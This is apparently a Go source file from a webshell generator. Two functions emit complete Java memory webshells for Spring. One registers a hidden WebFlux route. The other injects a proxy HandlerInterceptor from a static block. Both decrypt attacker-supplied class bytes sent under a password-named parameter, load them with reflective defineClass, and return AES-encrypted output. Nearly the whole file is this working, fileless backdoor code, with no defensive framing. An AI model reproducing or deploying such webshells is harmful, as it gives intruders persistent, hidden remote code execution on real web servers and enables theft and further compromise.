package GoSpring

import "webshell/common"

func GoSpringHadnler() {
	common.Filename = "SpringHandler.java"
	common.Webshells = `import org.springframework.web.server.ServerWebExchange;
import java.lang.reflect.*;
import java.util.*;
import java.util.function.Function;

public class SpringHandler {
    private static String password = "` + common.Password + `";

    private static Object lock = new Object();

    private Field getField(Object obj, String fieldName) {
        Class clazz;
        Field field = null;
        if (obj == null) {
            return null;
        }
        if (obj instanceof Class) {
            clazz = (Class) obj;
        } else {
            clazz = obj.getClass();
        }
        while (clazz != null) {
            try {
                field = clazz.getDeclaredField(fieldName);
                clazz = null;
            } catch (NoSuchFieldException e) {
                clazz = clazz.getSuperclass();
            }
        }
        if (field != null) {
            try {
                Field mf = Field.class.getDeclaredField("modifiers");
                mf.setAccessible(true);
                mf.setInt(field, field.getModifiers() & ~Modifier.FINAL);
                field.setAccessible(true);
            } catch (Exception e) {}
        }
        return field;
    }

    private Object getFieldValue(Object obj, String fieldName) {
        Field field;
        if (obj instanceof Field) {
            field = (Field) obj;
        } else {
            field = getField(obj, fieldName);
        }
        try {
            return field.get(obj);
        } catch (IllegalAccessException e) {
            return null;
        }
    }

    private Method getMethodX(Class clazz, String methodName, int num) {
        Method[] methods = clazz.getDeclaredMethods();
        for (Method method : methods) {
            if (method.getName().equals(methodName)) {
                if (method.getParameterTypes().length == num) {
                    return method;
                }
            }
        }
        return null;
    }

    private Method getMethod(Class clazz, String methodName, Class... args) {
        Method method = null;
        while (clazz != null) {
            try {
                method = clazz.getDeclaredMethod(methodName, args);
                clazz = null;
            } catch (NoSuchMethodException e) {
                clazz = clazz.getSuperclass();
            }
        }
        return method;
    }

    private Object invokeMethod(
        Object obj, String methodName, Object... args
    ) {
        ArrayList clazzs = new ArrayList();
        if (args != null) {
            for (int i=0; i<args.length; i++) {
                Object arg = args[i];
                if (arg != null) {
                    clazzs.add(arg.getClass());
                } else {
                    clazzs.add(null);
                }
            }
        }
        Method method = getMethod(
            obj.getClass(), methodName,
            (Class[]) clazzs.toArray(new Class[]{})
        );
        try {
            method.setAccessible(true);
            return method.invoke(obj, args);
        } catch (Exception e) {
            return null;
        }
    }

    private ClassLoader getLoader() {
        return Thread.currentThread().getContextClassLoader();
    }

    private byte[] b64decode(String payload) {
        Class base64;
        byte[] bytes = null;
        try {
            base64 = Class.forName("java.util.Base64");
            bytes = (byte[]) invokeMethod(
                getMethod(base64, "getDecoder").invoke(base64),
                "decode", payload
            );
        } catch (ClassNotFoundException e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                bytes = (byte[]) invokeMethod(
                    base64.newInstance(), "decodeBuffer", payload
                );
            } catch (Exception ex) {}
        } catch (Exception ex) {}
        return bytes;
    }


    private byte[] cipher(
        byte[] payload, String alg, byte[] key, boolean isEnc
    ) {
        try {
            javax.crypto.Cipher c = javax.crypto.Cipher.getInstance(alg);
            c.init(isEnc?1:2, new javax.crypto.spec.SecretKeySpec(key, alg));
            return c.doFinal(payload);
        } catch (Exception e) {
            return null;
        }
    }

    private String hasher(String str, String alg) {
        try {
            java.security.MessageDigest h =
                java.security.MessageDigest.getInstance(alg);
            h.update(str.getBytes(), 0, str.length());
            return new java.math.BigInteger(1, h.digest()).toString(16);
        } catch (Exception e) {
            return null;
        }
    }

    private byte[] decoder(String payload) {
        return cipher(
            b64decode(payload), "AES",
            hasher(password, "MD5").substring(0, 16).getBytes(), false
        );
    }


    public String b64encode(byte[] result) {
        Class base64;
        String str = null;
        try {
            base64 = Class.forName("java.util.Base64");
            str = (String) invokeMethod(
                getMethod(base64, "getEncoder").invoke(base64),
                "encodeToString", result
            );
        } catch (ClassNotFoundException e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                str = (String) invokeMethod(
                    base64.newInstance(), "encode", result
                );
            } catch (Exception ex) {}
        } catch (Exception ex) {}
        return str;
    }

    private String stub(String payload, Object request, Object response)
            throws Exception {
        if (payload == null) {
            return null;
        }
        byte b[] = decoder(payload);
        if (lock instanceof Class) {
            java.io.ByteArrayOutputStream arrOut =
                new java.io.ByteArrayOutputStream();
            Object f = invokeMethod(lock, "newInstance");
            f.equals(arrOut);
            f.equals(request);
            f.equals(b);
            f.toString();
            String fix = hasher(
                password + hasher(password, "MD5").substring(0, 16), "MD5"
            );
            String result = fix.substring(0, 16).toUpperCase()+
                b64encode(cipher(arrOut.toByteArray(), "AES",
                    hasher(password, "MD5").substring(0, 16).getBytes(), true)
                )+
                fix.substring(16).toUpperCase();
            try {
                invokeMethod(
                    invokeMethod(response, "getWriter"), "write", result
                );
            } catch (Exception e) {}
            return result;
        } else {
            Constructor constructor = java.security.SecureClassLoader.class
                .getDeclaredConstructor(ClassLoader.class);
            constructor.setAccessible(true);
            ClassLoader classloader = (ClassLoader) constructor.newInstance(
                new Object[]{this.getClass().getClassLoader()}
            );
            Method defineMethod = ClassLoader.class.getDeclaredMethod(
                "defineClass", byte[].class, int.class, int.class
            );
            defineMethod.setAccessible(true);
            lock = defineMethod.invoke(classloader, b, 0, b.length);
        }
        return null;
    }

    public synchronized <T> T hook(ServerWebExchange request)
            throws Exception {
        Class ServerWebExchange = Class.forName(
            "org.springframework.web.server.ServerWebExchange"
        );
        Object mono = getMethodX(
            ServerWebExchange, "getFormData", 0
        ).invoke(request);

        Class Mono = Class.forName("reactor.core.publisher.Mono");
        Method flatMap = getMethodX(Mono, "flatMap", 1);
        Function transformer = reqbody -> {
            Object resbody = null;
            try {
                Class MultiValueMap = Class.forName(
                    "org.springframework.util.MultiValueMap"
                );
                String payload = (String) getMethodX(
                    MultiValueMap, "getFirst", 1
                ).invoke(reqbody, password);
                String result = stub(payload, null, null);
                if (result == null) {result = "";}
                resbody = getMethodX(Mono, "just", 1).invoke(Mono, result);
            } catch (Exception e) {}
            return resbody;
        };

        Object resbody = flatMap.invoke(mono, transformer);
        Class HttpStatus = Class.forName(
            "org.springframework.http.HttpStatus"
        );
        Class ResponseEntity = Class.forName(
            "org.springframework.http.ResponseEntity"
        );
        Object OK = getFieldValue(HttpStatus, "OK");
        Constructor responseEntity = ResponseEntity.getConstructor(
            Object.class, HttpStatus
        );
        return (T) responseEntity.newInstance(resbody, OK);
    }

    public SpringHandler() {}

    public SpringHandler(
        Object requestMappingHandlerMapping, String path
    ) throws Exception {
        Class requestMappingInfo = Class.forName(
            "org.springframework.web.reactive.result.method.RequestMappingInfo"
        );
        Method mPaths = requestMappingInfo.getMethod("paths", String[].class);
        Method registerHandlerMethod = getMethodX(
            requestMappingHandlerMapping.getClass(),
            "registerHandlerMethod", 3
        );
        registerHandlerMethod.setAccessible(true);
        registerHandlerMethod.invoke(
            requestMappingHandlerMapping, new SpringHandler(),
            getMethodX(SpringHandler.class, "hook", 1),
            invokeMethod(mPaths.invoke(null, new Object[]{new String[]{path}}),
        "build")
        );
    }

    public static String addHandler(
        Object requestMappingHandlerMapping, String path
    ) {
        try {
            new SpringHandler(requestMappingHandlerMapping, path);
        } catch (Exception e) {}
        return "addHandler";
    }
}
`
}

func GoSpringInterceptor() {
	common.Filename = "SpringInterceptor.java"
	common.Webshells = `import java.lang.reflect.*;
import java.util.*;

public class SpringInterceptor implements InvocationHandler {
    private static String password = "` + common.Password + `";

    private static Object lock = new Object();

    private Field getField(Object obj, String fieldName) {
        Class clazz;
        Field field = null;
        if (obj == null) {
            return null;
        }
        if (obj instanceof Class) {
            clazz = (Class) obj;
        } else {
            clazz = obj.getClass();
        }
        while (clazz != null) {
            try {
                field = clazz.getDeclaredField(fieldName);
                clazz = null;
            } catch (NoSuchFieldException e) {
                clazz = clazz.getSuperclass();
            }
        }
        if (field != null) {
            try {
                Field mf = Field.class.getDeclaredField("modifiers");
                mf.setAccessible(true);
                mf.setInt(field, field.getModifiers() & ~Modifier.FINAL);
                field.setAccessible(true);
            } catch (Exception e) {}
        }
        return field;
    }

    private Object getFieldValue(Object obj, String fieldName) {
        Field field;
        if (obj instanceof Field) {
            field = (Field) obj;
        } else {
            field = getField(obj, fieldName);
        }
        try {
            return field.get(obj);
        } catch (IllegalAccessException e) {
            return null;
        }
    }

    private Method getMethodX(Class clazz, String methodName, int num) {
        Method[] methods = clazz.getDeclaredMethods();
        for (Method method : methods) {
            if (method.getName().equals(methodName)) {
                if (method.getParameterTypes().length == num) {
                    return method;
                }
            }
        }
        return null;
    }

    private Method getMethod(Class clazz, String methodName, Class... args) {
        Method method = null;
        while (clazz != null) {
            try {
                method = clazz.getDeclaredMethod(methodName, args);
                clazz = null;
            } catch (NoSuchMethodException e) {
                clazz = clazz.getSuperclass();
            }
        }
        return method;
    }

    private Object invokeMethod(
        Object obj, String methodName, Object... args
    ) {
        ArrayList clazzs = new ArrayList();
        if (args != null) {
            for (int i=0; i<args.length; i++) {
                Object arg = args[i];
                if (arg != null) {
                    clazzs.add(arg.getClass());
                } else {
                    clazzs.add(null);
                }
            }
        }
        Method method = getMethod(
            obj.getClass(), methodName,
            (Class[]) clazzs.toArray(new Class[]{})
        );
        try {
            method.setAccessible(true);
            return method.invoke(obj, args);
        } catch (Exception e) {
            return null;
        }
    }

    private ClassLoader getLoader() {
        return Thread.currentThread().getContextClassLoader();
    }

    private byte[] b64decode(String payload) {
        Class base64;
        byte[] bytes = null;
        try {
            base64 = Class.forName("java.util.Base64");
            bytes = (byte[]) invokeMethod(
                getMethod(base64, "getDecoder").invoke(base64),
                "decode", payload
            );
        } catch (ClassNotFoundException e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                bytes = (byte[]) invokeMethod(
                    base64.newInstance(), "decodeBuffer", payload
                );
            } catch (Exception ex) {}
        } catch (Exception ex) {}
        return bytes;
    }


    private Object getWebApplicationContext() throws Exception {
        Class requestContextHolder = Class.forName(
            "org.springframework.web.context.request.RequestContextHolder"
        );
        Object servletRequestAttributes = getMethodX(
            requestContextHolder, "currentRequestAttributes", 0
        ).invoke(requestContextHolder);
        Object request = getMethodX(
            servletRequestAttributes.getClass(), "getRequest", 0
        ).invoke(servletRequestAttributes);

        Class requestContextUtils = Class.forName(
            "org.springframework.web.servlet.support.RequestContextUtils"
        );
        return getMethodX(
            requestContextUtils, "findWebApplicationContext", 1
        ).invoke(requestContextUtils, request);
    }


    private byte[] cipher(
        byte[] payload, String alg, byte[] key, boolean isEnc
    ) {
        try {
            javax.crypto.Cipher c = javax.crypto.Cipher.getInstance(alg);
            c.init(isEnc?1:2, new javax.crypto.spec.SecretKeySpec(key, alg));
            return c.doFinal(payload);
        } catch (Exception e) {
            return null;
        }
    }

    private String hasher(String str, String alg) {
        try {
            java.security.MessageDigest h =
                java.security.MessageDigest.getInstance(alg);
            h.update(str.getBytes(), 0, str.length());
            return new java.math.BigInteger(1, h.digest()).toString(16);
        } catch (Exception e) {
            return null;
        }
    }

    private byte[] decoder(String payload) {
        return cipher(
            b64decode(payload), "AES",
            hasher(password, "MD5").substring(0, 16).getBytes(), false
        );
    }


    public String b64encode(byte[] result) {
        Class base64;
        String str = null;
        try {
            base64 = Class.forName("java.util.Base64");
            str = (String) invokeMethod(
                getMethod(base64, "getEncoder").invoke(base64),
                "encodeToString", result
            );
        } catch (ClassNotFoundException e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                str = (String) invokeMethod(
                    base64.newInstance(), "encode", result
                );
            } catch (Exception ex) {}
        } catch (Exception ex) {}
        return str;
    }

    private String stub(String payload, Object request, Object response)
            throws Exception {
        if (payload == null) {
            return null;
        }
        byte b[] = decoder(payload);
        if (lock instanceof Class) {
            java.io.ByteArrayOutputStream arrOut =
                new java.io.ByteArrayOutputStream();
            Object f = invokeMethod(lock, "newInstance");
            f.equals(arrOut);
            f.equals(request);
            f.equals(b);
            f.toString();
            String fix = hasher(
                password + hasher(password, "MD5").substring(0, 16), "MD5"
            );
            String result = fix.substring(0, 16).toUpperCase()+
                b64encode(cipher(arrOut.toByteArray(), "AES",
                    hasher(password, "MD5").substring(0, 16).getBytes(), true)
                )+
                fix.substring(16).toUpperCase();
            try {
                invokeMethod(
                    invokeMethod(response, "getWriter"), "write", result
                );
            } catch (Exception e) {}
            return result;
        } else {
            Constructor constructor = java.security.SecureClassLoader.class
                .getDeclaredConstructor(ClassLoader.class);
            constructor.setAccessible(true);
            ClassLoader classloader = (ClassLoader) constructor.newInstance(
                new Object[]{this.getClass().getClassLoader()}
            );
            Method defineMethod = ClassLoader.class.getDeclaredMethod(
                "defineClass", byte[].class, int.class, int.class
            );
            defineMethod.setAccessible(true);
            lock = defineMethod.invoke(classloader, b, 0, b.length);
        }
        return null;
    }

    private void hook(Object request, Object response) throws Exception {
        String payload = (String) invokeMethod(
            request, "getParameter", password
        );
        stub(payload, request, response);
    }

    @Override
    public Object invoke(Object proxy, Method method, Object[] args)
            throws Throwable {
        if (method.getName() == "preHandle") {
            Object request = args[0];
            Object response = args[1];
            hook(request, response);
        }
        return true;
    }

    private void addInterceptor(Object proxyObject) throws Exception {
        Class requestMappingHandlerMapping = Class.forName(
            "org.springframework.web.servlet.mvc.method.annotation"+
            ".RequestMappingHandlerMapping"
        );
        Object mapping = invokeMethod(
            getWebApplicationContext(), "getBean",
            requestMappingHandlerMapping
        );

        ArrayList adaptedInterceptors = (ArrayList) getFieldValue(
            mapping, "adaptedInterceptors"
        );
        for (Object adaptedInterceptor : adaptedInterceptors) {
            if (adaptedInterceptor instanceof Proxy) {
                return;
            }
        }
        adaptedInterceptors.add(proxyObject);
    }

    public SpringInterceptor() {
        synchronized(lock) {
            Class interceptorClass = null;
            try {
                interceptorClass = Class.forName(
                    "org.springframework.web.servlet.HandlerInterceptor"
                );
            } catch (ClassNotFoundException e) {}

            if (interceptorClass != null) {
                Object proxyObject = Proxy.newProxyInstance(
                    getLoader(),
                    new Class[]{interceptorClass},
                    this
                );
                try {
                    addInterceptor(proxyObject);
                } catch (Exception e) {}
            }
        }
    }

    static {
        new SpringInterceptor();
    }
}
`
}
